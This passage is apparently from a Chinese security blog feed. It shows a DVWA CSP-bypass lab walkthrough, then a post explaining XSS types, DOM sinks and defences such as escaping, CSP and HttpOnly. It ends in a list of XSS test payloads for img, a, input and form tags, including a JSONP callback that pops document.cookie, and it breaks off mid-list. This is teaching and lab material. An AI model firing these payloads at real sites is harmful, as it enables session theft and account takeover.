class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p>构造payload</p><p>可以加载本地的script并且需要nonce值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//只能加载本地的script</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析<code>../..//vulnerabilities/csp/source/jsonp.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: application&#x2F;json; charset&#x3D;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;</span><br><span class="line">$callback &#x3D; $_GET[&#39;callback&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp &#x3D; array (&quot;answer&quot; &#x3D;&gt; &quot;15&quot;);</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>high.js文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建&lt;script&gt;标签，并添加src属性source/jsonp.php?callback=solveSum，其中solveSum是一个函数，用来添加anser的值。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加代码之后，会将answer的值打印出来，这里如果我们将callback的值修改为文本的值也会打印出来。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"><span class="comment">//点击按钮之后会触发clickButton函数，该函数会添加前端代码。</span></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clickButton();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201006171328103.png" alt="image-20201006171328103"></p><p>构造payload–直接赋予callback值payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&#x3D;&lt;script src&#x3D;source&#x2F;jsonp.php?callback&#x3D;alert(document.cookie)&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Impossible.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加script代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp_impossible.php&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clickButton();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>source/jsonp_impossible.php</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里没有参数值接受参数也就无法输出js代码。</span></span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$outp = array (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;solveSum (&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OWSP-TOP10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞</title>
      <link href="2018/12/26/xss/"/>
      <url>2018/12/26/xss/</url>
      
        <content type="html"><![CDATA[<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户操作。</li><li>监听用户行为：通过恶意 js 脚本，可以做到监听用户各种事件，比如获取登陆的键入字符串完成 hack 用户信息。</li><li>更改 DOM 结构：比较常见的就是通过运营商或者路由器添加浮窗广告，增收自身收入。</li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p>只发生一次攻击，攻击代码不经过数据库，恶意代码提交到服务器，服务器解析并响应，浏览器最后执行恶意代码</p><h6 id="常见漏洞位置"><a href="#常见漏洞位置" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>网站搜索框、用户登录入口、注入表单的地方。</p><h5 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h5><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>可发生多次攻击，攻击者利用各种办法把恶意代码存储在受害者的数据库中，当用户每次取出恶意数据的时候出发恶意代码。</p><h6 id="常见漏洞位置-1"><a href="#常见漏洞位置-1" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>论坛、博客等留言位置、评论位置。</p><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>原理</p><p>DOM（Document Object Model）即文档对象模型，通过 JavaScript，您可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西。对HTML 元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><p>当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p><p>攻击者可以控制一些DOM对象、输入一些恶意JS代码，插入DOM结构，然后未做任何过滤直接输出到页面。</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var pos&#x3D;document.URL.indexOf(&quot;name&#x3D;&quot;)+5;</span><br><span class="line">document.write(decodeURI(document.URL.substring(pos,document.URL.length)));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>获取输入函数</p><ul><li>document.URL</li><li>document.URLUnencoded</li><li>document.location（及其许多属性）</li><li>document.referrer</li><li>window.location（及其许多属性）</li><li>location</li><li>location.href</li><li>location.search</li><li>location.hash</li><li>location.pathname</li></ul><p>输出函数</p><ul><li><p>eval(…)</p></li><li><p>window.execScript(…)</p></li><li><p>window.setInterval(…)</p></li><li><p>window.setTimeout(…)</p></li><li><p>document.write(…)</p></li><li><p>document.writeln(…)</p></li><li><p>element.innerHTML(…)</p></li><li><p>document.forms[0].action=… (and various other collections)</p></li><li><p>document.attachEvent(…)</p></li><li><p>document.create…(…)</p></li><li><p>document.execCommand(…)</p></li><li><p>document.body. … (accessing the DOM through the body object)</p></li><li><p>window.attachEvent(…)</p></li><li><p>document.location=… (and assigning to location’s href, host and hostname)</p></li><li><p>document.location.hostname=…</p></li><li><p>document.location.replace(…)</p></li><li><p>document.location.assign(…)</p></li><li><p>document.URL=…</p></li><li><p>window.navigate(…)</p></li><li><p>document.open(…)</p></li><li><p>window.open(…)</p></li><li><p>window.location.href=… (and assigning to location’s href, host and hostname)</p></li></ul><p>总结：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h4 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>1、用户的输入未经过数据库,直接拿到前台显示,比如搜索框</p><p>2、用户输入存入数据库,从数据库中取出,然后由相关的视图文件输出到网页,比如用户个人设置中的签名、用户名、用户描述等等</p><p>xss大多出现在输入框中</p><p>3、反射型xss输入在哪里输出就在那里,存储型xss输入之后存入数据库,取出数据库然后可能显示到各种地方</p><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><h5 id="存储xss和反射xss"><a href="#存储xss和反射xss" class="headerlink" title="存储xss和反射xss"></a>存储xss和反射xss</h5><p>1、纯前端渲染，把代码和数据分隔开。</p><ul><li><p>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</p></li><li><p>然后浏览器执行 HTML 中的 JavaScript。</p></li><li><p>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</p></li></ul><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞。</p><p>2、直接使用html实体转义函数,比如php函数<code>htmlspecialchars（）</code>和<code>htmlentities()</code>、<code>escapeHTML</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符转义后的字符</span><br><span class="line">&amp;   &amp;</span><br><span class="line">&lt;   &lt;</span><br><span class="line">&gt;   &gt;</span><br><span class="line">&quot;   &quot;</span><br><span class="line">&#39;   &amp;#x27;</span><br><span class="line">&#x2F;   &#x2F;</span><br></pre></td></tr></table></figure><p>不能仅仅靠实体转义函数来防御xss，像<code>javascript:alert(&amp;#x27;XSS&amp;#x27;)</code>这种类型的攻击，实体转义函数就不会对其起作用。</p><p>而且实体转义函数就有局限性，因为如果数据是json格式，双引号被转义会破坏json格式。</p><p>但是我们可以使用<code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><table><thead><tr><th>字符</th><th>转义后的字符</th></tr></thead><tbody><tr><td><code>U+2028</code></td><td><code>\u2028</code></td></tr><tr><td><code>U+2029</code></td><td><code>\u2029</code></td></tr><tr><td><code>&lt;</code></td><td><code>\u003c</code></td></tr></tbody></table><p>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。因此html转义也完全不能避免xss攻击。</p><table><thead><tr><th>XSS 安全漏洞</th><th>简单转义是否有防护作用</th></tr></thead><tbody><tr><td>HTML 标签文字内容</td><td>有</td></tr><tr><td>HTML 属性值</td><td>有</td></tr><tr><td>CSS 内联样式</td><td>无</td></tr><tr><td>内联 JavaScript</td><td>无</td></tr><tr><td>内联 JSON</td><td>无</td></tr><tr><td>跳转链接</td><td>无</td></tr></tbody></table><h5 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h5><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。</p><h5 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h5><p>1、充分利用 CSP，严格实施 CSP 操作，可以有效防范 XSS 攻击。</p><p>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</p><p>禁止向第三方域提交数据，这样用户数据也不会外泄；</p><p>2、使用 HttpOnly 属性。避免 js 脚本操作 Cookie，即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p><p>3、在用户提交时，由前端过滤输入，然后提交到后端。这种做法是不可取的。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。<br>4、数据插入数据库,取出数据库之后进行转义,然后由视图文件输出到网页。</p><p>5、数据插入数据、取出数据库都不转义,在视图文件中进行转义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment-content&quot;</span>&gt;&lt;?php echo htmlspecialchars($comment[<span class="string">&#x27;content&#x27;</span>];) ?&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1、xss的防御不仅仅只是前端或者只是后端应该关注的问题。防范存储型和反射型 XSS 是后端的责任。而 DOM 型 XSS 攻击不发生在后端，是前端的责任。防范 XSS 是需要后端和前端共同参与的系统工程。</p><p>2、关于转义的位置不能仅仅在输入出转义，转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p><p>3、html实体转义函数并不能完全防御xss。每一个转义函数转义的对象不同，因此不可能对用户的任何输入类型都进行转义。HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>1、如果前端限制,尝试burp抓包改包</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># XSS-Payload</span></span><br><span class="line">https:<span class="comment">//github.com/TheKingOfDuck/fuzzDicts/tree/master/easyXssPayload</span></span><br><span class="line">https:<span class="comment">//github.com/ZephrFish/XSSPayloads/blob/master/raw_payloads</span></span><br><span class="line">https:<span class="comment">//github.com/silience/xsspayload</span></span><br><span class="line">https:<span class="comment">//github.com/willc/XSSpayloads/blob/master/xss_payloads_6-20-12.txt</span></span><br><span class="line">https:<span class="comment">//github.com/AeolusTF/XssPayload/blob/master/XssPayload.txt</span></span><br></pre></td></tr></table></figure><p>2、xsspayload可以一条一条的测试,同样我们可以直接全部复制粘贴,根据弹框数字去我们的payload中找到可用的语句,同样也可以借助burp等工具fuzz测试</p><p>3、手工测试常见标签</p><p><code>&lt;img&gt;</code>标签</p><p>利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><p>标准格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p><code>input</code>标签</p><p>标准格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;标签</code></p><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;form 